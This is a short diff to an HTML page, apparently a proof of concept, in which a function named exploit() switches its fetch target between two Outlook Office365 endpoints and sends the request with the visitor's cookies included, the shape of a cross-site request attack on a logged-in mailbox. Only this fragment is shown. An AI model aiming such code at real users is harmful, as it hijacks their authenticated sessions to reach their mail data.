@@ -11,7 +11,7 @@
 
   <script>
     function exploit() {
-      fetch("https://outlook.office365.com/owa/service.svc?action=GetOwaUserConfiguration", {
+      fetch("https://outlook.office365.com/api/beta/me/translateExchangeIds?n=88", {
         method: "POST",
         credentials: "include",
         headers: {
